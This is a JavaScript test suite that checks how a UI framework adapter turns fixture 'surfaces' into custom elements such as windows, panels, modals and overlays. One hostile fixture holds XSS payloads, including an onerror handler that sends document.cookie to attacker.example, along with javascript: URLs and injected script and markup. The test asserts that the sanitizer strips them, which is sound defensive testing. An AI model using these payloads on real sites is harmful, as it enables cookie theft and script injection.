const fs = require('fs');
const path = require('path');
const vm = require('vm');
const {
  createSuiteContext,
  printSuiteReport
} = require('../utils/assertions');
const {
  readJson,
  readText,
  resolveRepoPath,
  resolveRootDir
} = require('../utils/files');
const {
  syntaxCheckFile
} = require('../utils/process');
const {
  MATERIALIZED_COMPONENT_TAGS,
  REQUIRED_ARTIFACTS,
  RUNTIME_ARTIFACTS,
  SURFACE_ADAPTER_ID,
  SURFACE_ADAPTER_SCHEMA,
  SURFACE_MANAGER_MATERIALIZATION_BACKLOG,
  SURFACE_MANAGER_MATERIALIZATION_FIXTURE,
  SURFACE_MANAGER_MATERIALIZATION_LOCAL_GATE,
  SURFACE_MANAGER_MATERIALIZATION_MODULE,
  SURFACE_MANAGER_MATERIALIZATION_PACKAGE_SCRIPT,
  SURFACE_MANAGER_MATERIALIZATION_REPORT_SCHEMA,
  SURFACE_MANAGER_MATERIALIZATION_SCHEMA,
  SURFACE_MANAGER_MATERIALIZATION_STATUS,
  SURFACE_MANAGER_MATERIALIZATION_SUITE,
  SURFACE_MANAGER_MATERIALIZATION_TARGET,
  SURFACE_MANAGER_MATERIALIZATION_WORKPACKAGE,
  SURFACE_MANAGER_MATERIALIZATION_WORKPACKAGE_DOC,
  SURFACE_MATERIALIZATION_OPERATIONS,
  SURFACE_MATERIALIZATION_SCHEMA,
  createSurfaceManagerMaterializationPlan,
  createSurfaceManagerMaterializationReport,
  validateSurfaceManagerMaterializationPlan
} = require('../../catalog/surface-manager-materialization');

function assertFileExists(context, relativePath, rootDir, message) {
  context.assert(fs.existsSync(resolveRepoPath(relativePath, rootDir)), message);
}

function assertIncludesAll(context, values, expected, label) {
  expected.forEach((entry) => {
    context.assert(Array.isArray(values) && values.includes(entry), `${label} includes ${entry}`);
  });
}

function assertTextIncludesAll(context, text, expected, label) {
  expected.forEach((entry) => {
    context.assertIncludes(text, entry, `${label} includes ${entry}`);
  });
}

function matchesSelector(element, selector) {
  const rawSelector = String(selector || '').trim();
  if (!rawSelector || !element || element.nodeType !== 1) return false;
  const selectorMatch = rawSelector.match(/^([a-z0-9-]+)?(?:\[([^=\]]+)="([^"]*)"\])?$/iu);
  if (!selectorMatch) return false;
  const [, tagName, attrName, attrValue] = selectorMatch;
  if (tagName && element.localName !== tagName.toLowerCase()) return false;
  if (attrName) return element.getAttribute(attrName) === attrValue;
  return true;
}

function queryAll(element, selector) {
  const selectors = String(selector || '').split(',').map((entry) => entry.trim()).filter(Boolean);
  const results = [];
  function visit(node) {
    if (!node || !Array.isArray(node.children)) return;
    node.children.forEach((child) => {
      if (child.nodeType === 1 && selectors.some((entry) => matchesSelector(child, entry))) {
        results.push(child);
      }
      visit(child);
    });
  }
  visit(element);
  return results;
}

function createFakeElement(tagName, ownerDocument) {
  const element = {
    nodeType: 1,
    localName: String(tagName || '').toLowerCase(),
    tagName: String(tagName || '').toUpperCase(),
    ownerDocument,
    parentNode: null,
    attributes: Object.create(null),
    children: [],
    textContent: '',
    id: '',
    registered: [],
    operations: [],
    events: [],
    setAttribute(name, value) {
      this.attributes[name] = String(value);
      if (name === 'id') this.id = String(value);
    },
    getAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this.attributes, name) ? this.attributes[name] : null;
    },
    hasAttribute(name) {
      return Object.prototype.hasOwnProperty.call(this.attributes, name);
    },
    removeAttribute(name) {
      delete this.attributes[name];
    },
    appendChild(child) {
      if (child && typeof child === 'object') child.parentNode = this;
      this.children.push(child);
      return child;
    },
    querySelector(selector) {
      return queryAll(this, selector)[0] || null;
    },
    querySelectorAll(selector) {
      return queryAll(this, selector);
    },
    dispatchEvent(event) {
      this.events.push(event);
      return true;
    }
  };

  if (element.localName === 'x-surface-manager') {
    element.registerSurface = function registerSurface(record) {
      this.registered.push(record);
      this.operations.push({ operation: 'registerSurface', id: record && record.id, record });
      return { ok: true, operation: 'registerSurface', metadata: { surfaceId: record && record.id } };
    };
    element.snapshot = function snapshot() {
      return {
        schema: 'xtend.surface.snapshot.v1',
        surfaces: this.registered.map((record) => ({
          id: record.id,
          type: record.type,
          manager: record.manager,
          contentRef: record.contentRef
        }))
      };
    };
  }
  return element;
}

function createFakeDocument() {
  const documentTarget = {
    createElement(tagName) {
      return createFakeElement(tagName, documentTarget);
    },
    createTextNode(text) {
      return {
        nodeType: 3,
        textContent: String(text || ''),
        parentNode: null
      };
    },
    querySelector(selector) {
      return this.body.querySelector(selector);
    },
    querySelectorAll(selector) {
      return this.body.querySelectorAll(selector);
    },
    addEventListener() {},
    removeEventListener() {},
    dispatchEvent() {
      return true;
    }
  };
  documentTarget.documentElement = createFakeElement('html', documentTarget);
  documentTarget.body = createFakeElement('body', documentTarget);
  documentTarget.documentElement.appendChild(documentTarget.body);
  return documentTarget;
}

function createSandbox() {
  function CustomEvent(type, init = {}) {
    this.type = type;
    this.detail = init.detail || null;
    this.bubbles = init.bubbles === true;
    this.composed = init.composed === true;
  }
  const documentTarget = createFakeDocument();
  const sandbox = {
    console,
    setTimeout,
    clearTimeout,
    performance: { now: () => 0 },
    navigator: { userAgent: 'xtend-surface-materialization-test' },
    CustomEvent,
    document: documentTarget
  };
  sandbox.globalThis = sandbox;
  sandbox.window = sandbox;
  sandbox.self = sandbox;
  return sandbox;
}

function evaluateXtendRmtArtifact(context, relativePath, rootDir) {
  const source = readText(relativePath, rootDir);
  const sandbox = createSandbox();
  const executableSource = relativePath.endsWith('.esm.js')
    ? source.replace(/\nexport\s+\{[\s\S]*?\};\s*\nexport default XtendRmtProduct;\s*$/u, '')
    : source;
  try {
    vm.runInNewContext(executableSource, sandbox, { filename: relativePath });
  } catch (error) {
    context.fail(`${relativePath} evaluates with surface materialization (${error.message})`);
    return null;
  }
  return sandbox.AppModules || null;
}

function findSurface(managerElement, surfaceId) {
  return managerElement.querySelector(`[surface-id="${surfaceId}"]`);
}

function countByTag(elements) {
  return elements.reduce((counts, element) => {
    counts[element.localName] = (counts[element.localName] || 0) + 1;
    return counts;
  }, {});
}

function runSurfaceManagerMaterializationSuite(options = {}) {
  const rootDir = resolveRootDir(options.rootDir || path.resolve(__dirname, '..', '..'));
  const context = createSuiteContext({
    id: 'surface-native-materialization',
    label: 'SurfaceManager native surfaces materialization'
  });
  const plan = createSurfaceManagerMaterializationPlan({ rootDir });
  const validation = validateSurfaceManagerMaterializationPlan(plan);
  const report = createSurfaceManagerMaterializationReport({ rootDir, plan });
  const fixture = readJson(SURFACE_MANAGER_MATERIALIZATION_FIXTURE, rootDir);
  const coreTypes = readText('xtendrmt/rmt-core.d.ts', rootDir);
  const coreRuntime = readText('xtendrmt/rmt-core.esm.js', rootDir);
  const packageManifest = readJson('package.json', rootDir);
  const metadata = packageManifest.xtend && packageManifest.xtend.surfaceManagerMaterialization;
  const runner = readText('scripts/run_xtend_tests.js', rootDir);
  const backlog = readText(SURFACE_MANAGER_MATERIALIZATION_BACKLOG, rootDir);
  const workpackageDoc = readText(SURFACE_MANAGER_MATERIALIZATION_WORKPACKAGE_DOC, rootDir);

  REQUIRED_ARTIFACTS.forEach((filePath) => {
    assertFileExists(context, filePath, rootDir, `${filePath} exists as surface materialization artifact`);
  });

  [
    SURFACE_MANAGER_MATERIALIZATION_MODULE,
    SURFACE_MANAGER_MATERIALIZATION_SUITE,
    ...RUNTIME_ARTIFACTS.filter((artifact) => artifact.endsWith('.js'))
  ].forEach((filePath) => {
    const syntax = syntaxCheckFile(filePath, { rootDir, extension: '.js' });
    context.assert(syntax.ok, `${filePath} syntax passes${syntax.ok ? '' : ` (${syntax.message})`}`);
  });

  context.assert(plan.schema === SURFACE_MANAGER_MATERIALIZATION_SCHEMA, 'Surface materialization schema is stable');
  context.assert(plan.reportSchema === SURFACE_MANAGER_MATERIALIZATION_REPORT_SCHEMA, 'Surface materialization report schema is stable');
  context.assert(plan.materializationSchema === SURFACE_MATERIALIZATION_SCHEMA, 'Surface materialization runtime result schema is stable');
  context.assert(plan.adapterSchema === SURFACE_ADAPTER_SCHEMA, 'Surface materialization reuses xtend.surface adapter schema');
  context.assert(plan.adapterId === SURFACE_ADAPTER_ID, 'Surface materialization uses xtend.surface adapter id');
  context.assert(plan.workpackage === SURFACE_MANAGER_MATERIALIZATION_WORKPACKAGE, 'Surface materialization belongs to WP-SM-11');
  context.assert(plan.status === SURFACE_MANAGER_MATERIALIZATION_STATUS, 'Surface materialization status is implemented');
  context.assert(plan.targetReadiness === SURFACE_MANAGER_MATERIALIZATION_TARGET, 'Surface materialization target readiness is stable');
  context.assert(plan.runtimeBoundary.materializesDom === true, 'WP-SM-11 owns DOM materialization');
  context.assert(plan.runtimeBoundary.createsSecondRegistry === false, 'Surface materialization does not create a second registry');
  context.assert(plan.runtimeBoundary.monkeypatchesDocsApp === false, 'Surface materialization is framework-native');
  context.assert(validation.ok === true, 'Surface materialization plan validates');
  context.assert(report.ok === true, 'Surface materialization report validates');
  assertIncludesAll(context, plan.operations, SURFACE_MATERIALIZATION_OPERATIONS, 'Surface materialization operations');
  assertIncludesAll(context, plan.materializedComponentTags, MATERIALIZED_COMPONENT_TAGS, 'Materialized component tags');

  const componentTags = fixture.components.map((component) => component.tag);
  context.assert(componentTags.includes('x-surface-manager'), 'Fixture keeps x-surface-manager as shell manager component');
  ['x-surface-window', 'x-surface-region', 'x-side-panel', 'x-modal', 'x-dialog', 'x-drawer', 'x-popover', 'x-tooltip', 'x-toast', 'x-lightbox', 'x-menu'].forEach((tag) => {
    context.assert(!componentTags.includes(tag), `Fixture does not maintain parallel ${tag} component records`);
  });
  context.assert(Array.isArray(fixture.surfaces) && fixture.surfaces.length === 12, 'Fixture declares twelve native surfaces');
  context.assert(fixture.surfaces.every((surface) => String(surface.component || '').endsWith('.content')), 'Native surfaces reference content components');

  const evaluatedArtifacts = [
    'xtendrmt/rmt-core.esm.js',
    'xtendrmt/rmt-runtime.esm.js',
    'xtendrmt/rmt-runtime.browser.js'
  ].map((artifact) => ({ artifact, modules: evaluateXtendRmtArtifact(context, artifact, rootDir) }));

  evaluatedArtifacts.forEach(({ artifact, modules }) => {
    if (!modules) return;
    const adapter = modules.createRmtSurfaceAdapter();
    context.assert(typeof adapter.materializeSurfaces === 'function', `${artifact} exposes materializeSurfaces`);
    assertIncludesAll(context, adapter.runtimeSurface, ['materializeSurfaces'], `${artifact} runtimeSurface`);
    assertIncludesAll(context, adapter.capabilities.providedCapabilities, ['nativeSurfaces', 'surfaceMaterialization'], `${artifact} capabilities`);
  });

  const coreModules = evaluatedArtifacts.find((entry) => entry.artifact === 'xtendrmt/rmt-core.esm.js').modules;
  if (coreModules && typeof coreModules.createRmtSurfaceAdapter === 'function') {
    const adapter = coreModules.createRmtSurfaceAdapter();
    const documentTarget = createFakeDocument();
    const root = documentTarget.createElement('main');
    documentTarget.body.appendChild(root);
    const materializedResult = adapter.materializeSurfaces(fixture, {
      root,
      domDocument: documentTarget,
      rmtDocument: fixture
    });
    const managerElement = root.querySelector('x-surface-manager');
    const surfaces = managerElement ? managerElement.children.filter((child) => child.nodeType === 1) : [];
    const tagCounts = countByTag(surfaces);
    const inspector = managerElement && findSurface(managerElement, 'surface.inspector');
    const editor = managerElement && findSurface(managerElement, 'surface.editor');
    const properties = managerElement && findSurface(managerElement, 'surface.properties');
    const drawer = managerElement && findSurface(managerElement, 'surface.drawer');
    const region = managerElement && findSurface(managerElement, 'surface.summaryCard');
    const popover = managerElement && findSurface(managerElement, 'surface.popover');
    const tooltip = managerElement && findSurface(managerElement, 'surface.tooltip');
    const toast = managerElement && findSurface(managerElement, 'surface.toast');
    const lightbox = managerElement && findSurface(managerElement, 'surface.lightbox');
    const menu = managerElement && findSurface(managerElement, 'surface.menu');

    context.assert(materializedResult.ok === true, 'materializeSurfaces returns ok');
    context.assert(materializedResult.metadata.schema === SURFACE_MATERIALIZATION_SCHEMA, 'materializeSurfaces returns materialization schema metadata');
    context.assert(materializedResult.metadata.surfaceCount === 12, 'materializeSurfaces maps twelve surfaces');
    context.assert(materializedResult.metadata.materializedCount === 12, 'materializeSurfaces creates twelve XTend UI surface elements');
    context.assert(materializedResult.metadata.managerCount === 1 && materializedResult.metadata.createdManagerCount === 1, 'materializeSurfaces creates one x-surface-manager');
    context.assert(materializedResult.metadata.registeredCount === 12, 'materializeSurfaces registers twelve surfaces on the manager');
    context.assert(materializedResult.metadata.createsSecondRegistry === false, 'materializeSurfaces does not create a second registry');
    context.assert(managerElement && managerElement.localName === 'x-surface-manager', 'Materialization creates x-surface-manager');
    context.assert(managerElement && managerElement.getAttribute('manager-id') === 'workbench.manager', 'Materialized manager keeps RMT manager id');
    context.assert(managerElement && managerElement.getAttribute('restore-key') === 'fixture.surface.materialization.layout', 'Materialized manager receives component attributes');
    context.assert(tagCounts['x-surface-window'] === 2, 'Materialization creates two x-surface-window elements');
    context.assert(tagCounts['x-side-panel'] === 1, 'Materialization creates one x-side-panel element');
    context.assert(tagCounts['x-modal'] === 1, 'Materialization creates one x-modal element');
    context.assert(tagCounts['x-dialog'] === 1, 'Materialization creates one x-dialog element');
    context.assert(tagCounts['x-drawer'] === 1, 'Materialization creates one x-drawer element');
    context.assert(tagCounts['x-surface-region'] === 1, 'Materialization creates one x-surface-region element');
    context.assert(tagCounts['x-popover'] === 1, 'Materialization creates one x-popover element');
    context.assert(tagCounts['x-tooltip'] === 1, 'Materialization creates one x-tooltip element');
    context.assert(tagCounts['x-toast'] === 1, 'Materialization creates one x-toast element');
    context.assert(tagCounts['x-lightbox'] === 1, 'Materialization creates one x-lightbox element');
    context.assert(tagCounts['x-menu'] === 1, 'Materialization creates one x-menu element');
    context.assert(inspector && inspector.getAttribute('slot') === 'windows', 'Window surface is assigned to windows slot');
    context.assert(inspector && inspector.getAttribute('open') === '' && inspector.getAttribute('active') === '', 'Inspector carries open and active attributes');
    context.assert(inspector && inspector.getAttribute('initial-x') === '96' && inspector.getAttribute('initial-width') === '520', 'Inspector receives initial bounds');
    context.assert(editor && editor.getAttribute('bounds-mode') === 'responsive' && editor.getAttribute('bounds-scope') === 'viewport', 'Editor receives responsive bounds mode and scope');
    context.assert(editor && editor.getAttribute('initial-width') === 'clamp(20rem, 70vi, 52rem)' && editor.getAttribute('initial-height') === 'min(80dvh, 42rem)', 'Editor receives CSS-native responsive bounds');
    context.assert(editor && editor.getAttribute('initial-min-width') === '18rem' && editor.getAttribute('initial-max-height') === '48rem', 'Editor receives CSS-native responsive bounds constraints');
    context.assert(inspector && inspector.getAttribute('data-rmt-content-ref') === 'inspector.content', 'Inspector keeps content ref');
    context.assert(inspector && inspector.children[0] && inspector.children[0].localName === 'x-code', 'Inspector content component is mounted as child');
    context.assert(inspector && inspector.children[0] && inspector.children[0].getAttribute('data-rmt-component') === 'inspector.content', 'Inspector content child keeps RMT component id');
    context.assert(properties && properties.getAttribute('slot') === 'panels', 'Side panel is assigned to panels slot');
    context.assert(properties && properties.getAttribute('placement') === 'right' && properties.getAttribute('mode') === 'docked', 'Side panel receives placement and mode');
    context.assert(properties && properties.getAttribute('initial-width') === '320', 'Side panel receives initial width');
    context.assert(drawer && drawer.getAttribute('slot') === 'overlays', 'Drawer is assigned to overlays slot');
    context.assert(drawer && drawer.getAttribute('placement') === 'left' && drawer.getAttribute('mode') === 'overlay', 'Drawer receives placement and mode');
    context.assert(drawer && drawer.getAttribute('modal') === '', 'Drawer receives modal accessibility attribute');
    context.assert(region && region.getAttribute('slot') === null, 'Region surface is assigned to the default manager slot');
    context.assert(region && region.getAttribute('data-surface-type') === 'region' && region.getAttribute('data-surface-kind') === 'card', 'Region preserves RMT kind semantics');
    context.assert(region && region.getAttribute('open') === '', 'Region carries default open state');
    context.assert(popover && popover.getAttribute('slot') === 'overlays' && popover.getAttribute('placement') === 'bottom', 'Popover is assigned to overlays slot');
    context.assert(tooltip && tooltip.getAttribute('slot') === 'overlays' && tooltip.getAttribute('placement') === 'top', 'Tooltip is assigned to overlays slot');
    context.assert(toast && toast.getAttribute('slot') === 'overlays', 'Toast is assigned to overlays slot');
    context.assert(lightbox && lightbox.getAttribute('slot') === 'overlays', 'Lightbox is assigned to overlays slot');
    context.assert(menu && menu.getAttribute('slot') === 'overlays' && menu.getAttribute('placement') === 'bottom-start', 'Menu is assigned to overlays slot');
    context.assert(managerElement && managerElement.registered.every((record) => record.manager === 'workbench.manager'), 'Registered records target the materialized manager');
    context.assert(managerElement && managerElement.registered[0].contentRef === 'inspector.content', 'Registered records keep component refs as content refs');
    context.assert(managerElement && managerElement.registered.some((record) => record.type === 'region' && record.kind === 'card'), 'Registered records preserve RMT kind');
    context.assert(managerElement && managerElement.registered.some((record) => record.id === 'surface.editor' && record.metadata && record.metadata.initialBoundsCss && record.metadata.boundsMode === 'responsive'), 'Registered responsive surface records keep initial bounds css metadata');

    const hostileDocument = createFakeDocument();
    const hostileRoot = hostileDocument.createElement('main');
    hostileDocument.body.appendChild(hostileRoot);
    adapter.materializeSurfaces({
      surfaces: [{
        id: 'surface.hostile',
        type: 'window',
        manager: 'workbench.manager',
        component: 'hostile.content'
      }],
      components: [{
        id: 'hostile.content',
        tag: 'script',
        attributes: {
          onerror: 'fetch("https://attacker.example/?c="+document.cookie)',
          href: 'javascript:alert(1)',
          style: 'background-image:url(javascript:alert(2))',
          srcdoc: '<script>alert(3)</script>',
          title: 'Safe title'
        },
        props: {
          innerHTML: '<img src=x onerror=alert(4)>',
          outerHTML: '<svg onload=alert(5)>',
          onclick: 'alert(6)',
          textContent: 'safe text'
        }
      }]
    }, {
      root: hostileRoot,
      domDocument: hostileDocument
    });
    const hostileManager = hostileRoot.querySelector('x-surface-manager');
    const hostileSurface = hostileManager && findSurface(hostileManager, 'surface.hostile');
    const hostileContent = hostileSurface && hostileSurface.children[0];
    context.assert(hostileContent && hostileContent.localName === 'div', 'Unsafe component tags fall back to inert div elements');
    context.assert(hostileContent && hostileContent.getAttribute('onerror') === null, 'Surface materialization drops event handler attributes');
    context.assert(hostileContent && hostileContent.getAttribute('href') === null, 'Surface materialization drops javascript: URL attributes');
    context.assert(hostileContent && hostileContent.getAttribute('style') === null, 'Surface materialization drops inline style attributes');
    context.assert(hostileContent && hostileContent.getAttribute('srcdoc') === null, 'Surface materialization drops srcdoc attributes');
    context.assert(hostileContent && hostileContent.innerHTML === undefined, 'Surface materialization does not assign innerHTML props');
    context.assert(hostileContent && hostileContent.onclick === undefined, 'Surface materialization does not assign event handler props');
    context.assert(hostileContent && hostileContent.textContent === 'safe text', 'Surface materialization preserves safe scalar props');

    const existingDocument = createFakeDocument();
    const existingManager = existingDocument.createElement('x-surface-manager');
    const existingInspector = existingDocument.createElement('x-surface-window');
    existingInspector.setAttribute('surface-id', 'surface.inspector');
    existingManager.appendChild(existingInspector);
    const boundResult = adapter.materializeSurfaces(fixture, {
      managerElement: existingManager,
      domDocument: existingDocument,
      rmtDocument: fixture
    });
    const duplicateInspectors = existingManager.querySelectorAll('[surface-id="surface.inspector"]');
    context.assert(boundResult.ok === true && boundResult.metadata.boundCount === 1, 'materializeSurfaces binds an existing surface element');
    context.assert(boundResult.metadata.materializedCount === 11, 'materializeSurfaces creates only missing surfaces when binding existing DOM');
    context.assert(duplicateInspectors.length === 1, 'materializeSurfaces does not duplicate existing surfaces');
  }

  assertTextIncludesAll(context, coreTypes, [
    'RmtSurfaceMaterializationHandle',
    'RmtSurfaceMaterializedElementHandle',
    'materializeSurfaces',
    'xtend.surface.materialization.v1'
  ], 'RMT type artifact surface materialization');
  assertTextIncludesAll(context, coreRuntime, [
    'SURFACE_MATERIALIZATION_SCHEMA',
    'resolveSurfaceMaterializedTag',
    'appendSurfaceMaterializedContent',
    'materializeSurfaces'
  ], 'RMT core runtime surface materialization');
  context.assert(metadata && metadata.schema === SURFACE_MANAGER_MATERIALIZATION_SCHEMA, 'Package metadata exposes surface materialization schema');
  context.assert(metadata && metadata.localGate === SURFACE_MANAGER_MATERIALIZATION_LOCAL_GATE, 'Package metadata exposes surface materialization gate');
  context.assert(metadata && metadata.packageScript === SURFACE_MANAGER_MATERIALIZATION_PACKAGE_SCRIPT, 'Package metadata exposes surface materialization package script');
  context.assert(packageManifest.scripts && packageManifest.scripts['test:surface-native-materialization'] === 'node scripts/run_xtend_tests.js surface-native-materialization', 'Package script test:surface-native-materialization exists');
  context.assertIncludes(runner, "require('../tests/rmt/surface_manager_materialization_suite')", 'Runner imports surface materialization suite');
  context.assertIncludes(runner, "id: 'surface-native-materialization'", 'Runner registers surface materialization suite');
  assertTextIncludesAll(context, backlog, [
    '`WP-SM-11` | P0 | completed',
    'Native `surfaces[*]` in XTend-UI-Komponenten materialisieren',
    'WP-SM-12'
  ], 'Surface materialization backlog status');
  assertTextIncludesAll(context, workpackageDoc, [
    'Status: `completed`',
    SURFACE_MANAGER_MATERIALIZATION_SCHEMA,
    SURFACE_MANAGER_MATERIALIZATION_LOCAL_GATE,
    'keine parallelen Surface-Komponentenrecords',
    'no-second-surface-registry'
  ], 'Surface materialization workpackage doc');

  return context.result({
    report: {
      schema: SURFACE_MANAGER_MATERIALIZATION_REPORT_SCHEMA,
      workpackage: SURFACE_MANAGER_MATERIALIZATION_WORKPACKAGE,
      adapterId: SURFACE_ADAPTER_ID,
      operationCount: SURFACE_MATERIALIZATION_OPERATIONS.length,
      materializedComponentTags: MATERIALIZED_COMPONENT_TAGS.length
    }
  });
}

function printSurfaceManagerMaterializationReport(result) {
  printSuiteReport(result, {
    successTitle: 'SurfaceManager Native Materialization erfolgreich.',
    failureTitle: 'SurfaceManager Native Materialization fehlgeschlagen:'
  });
}

module.exports = {
  printSurfaceManagerMaterializationReport,
  runSurfaceManagerMaterializationSuite
};

if (require.main === module) {
  const result = runSurfaceManagerMaterializationSuite();
  printSurfaceManagerMaterializationReport(result);
  process.exit(result.ok ? 0 : 1);
}
